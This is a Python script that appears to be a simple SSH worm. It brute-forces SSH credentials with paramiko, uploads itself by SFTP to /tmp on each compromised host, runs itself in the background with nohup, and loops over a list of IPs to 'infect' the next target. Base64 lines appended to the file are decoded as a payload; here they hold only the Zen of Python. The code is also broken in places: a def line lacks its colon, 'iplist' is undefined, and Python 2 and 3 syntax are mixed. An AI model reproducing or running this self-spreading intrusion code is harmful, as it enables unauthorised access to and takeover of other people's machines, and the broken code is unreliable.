import paramiko
from base64 import b64encode, b64decode
import sys
import os

TAG = b'#~'
if sys.version_info[0] >= 3:
    bytes_out = sys.stdout.buffer
else:
    bytes_out = sys.stdout

def AttackSSH(ipAddress)
  dictionaryFile = "/usr/share/dict/words" # or /usr/dict/words
  print "[+] Attacking Host : %s " %ipAddress
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  for line in open(dictionaryFile, "r").readlines() :
    [username, password] = line.strip().split()
    try :
      print "[+] Trying to break in with username: %s password: %s " % (username, password)
      ssh.connect(ipAddress, username=username, password=password)
    except paramiko.AuthenticationException:
      print "[-] Failed! ..."
      continue 
    print "[+] Success ... username: %s and passoword %s is VALID! " % (username, password)
    UploadFileAndExecute(ssh, sys.argv[0])#use this file
    ssh.close()
    break

def UploadFileAndExecute(ssh, fileName) :
  sftpClient = ssh.open_sftp()
  sftpClient.put(fileName, "/tmp/" +fileName)
  ssh.exec_command("chmod a+x /tmp/" +fileName)
  ssh.exec_command("nohup /tmp/" +fileName+ " &")

def read_extractor_lines(dest=bytes_out):
    "Read self extraction lines from this script and write to dest"
    script = os.path.abspath(sys.argv[0])
    with open(script, 'rb') as source:
        for line in source:
            if not line.startswith(TAG):
                continue
            bytes_out.write(b64decode(line[len(TAG):-1]))

if __name__ == "__main__" :
  read_extractor_lines() #extract service-script
  #exec service-script #exec payload
  
  #make list of ip's visible from host
  for ip in iplist:
    AttackSSH(ip) #find next target to infect


#~VGhlIFplbiBvZiBQeXRob24sIGJ5IFRpbSBQZXRlcnMKCkJlYXV0aWZ1bCBpcyBi
#~ZXR0ZXIgdGhhbiB1Z2x5LgpFeHBsaWNpdCBpcyBiZXR0ZXIgdGhhbiBpbXBsaWNp
#~dC4KU2ltcGxlIGlzIGJldHRlciB0aGFuIGNvbXBsZXguCkNvbXBsZXggaXMgYmV0
#~dGVyIHRoYW4gY29tcGxpY2F0ZWQuCkZsYXQgaXMgYmV0dGVyIHRoYW4gbmVzdGVk
#~LgpTcGFyc2UgaXMgYmV0dGVyIHRoYW4gZGVuc2UuClJlYWRhYmlsaXR5IGNvdW50
#~cy4KU3BlY2lhbCBjYXNlcyBhcmVuJ3Qgc3BlY2lhbCBlbm91Z2ggdG8gYnJlYWsg
#~dGhlIHJ1bGVzLgpBbHRob3VnaCBwcmFjdGljYWxpdHkgYmVhdHMgcHVyaXR5LgpF
#~cnJvcnMgc2hvdWxkIG5ldmVyIHBhc3Mgc2lsZW50bHkuClVubGVzcyBleHBsaWNp
#~dGx5IHNpbGVuY2VkLgpJbiB0aGUgZmFjZSBvZiBhbWJpZ3VpdHksIHJlZnVzZSB0
#~aGUgdGVtcHRhdGlvbiB0byBndWVzcy4KVGhlcmUgc2hvdWxkIGJlIG9uZS0tIGFu
#~ZCBwcmVmZXJhYmx5IG9ubHkgb25lIC0tb2J2aW91cyB3YXkgdG8gZG8gaXQuCkFs
#~dGhvdWdoIHRoYXQgd2F5IG1heSBub3QgYmUgb2J2aW91cyBhdCBmaXJzdCB1bmxl
#~c3MgeW91J3JlIER1dGNoLgpOb3cgaXMgYmV0dGVyIHRoYW4gbmV2ZXIuCkFsdGhv
#~dWdoIG5ldmVyIGlzIG9mdGVuIGJldHRlciB0aGFuICpyaWdodCogbm93LgpJZiB0
#~aGUgaW1wbGVtZW50YXRpb24gaXMgaGFyZCB0byBleHBsYWluLCBpdCdzIGEgYmFk
#~IGlkZWEuCklmIHRoZSBpbXBsZW1lbnRhdGlvbiBpcyBlYXN5IHRvIGV4cGxhaW4s
#~IGl0IG1heSBiZSBhIGdvb2QgaWRlYS4KTmFtZXNwYWNlcyBhcmUgb25lIGhvbmtp
#~bmcgZ3JlYXQgaWRlYSAtLSBsZXQncyBkbyBtb3JlIG9mIHRob3NlIQo==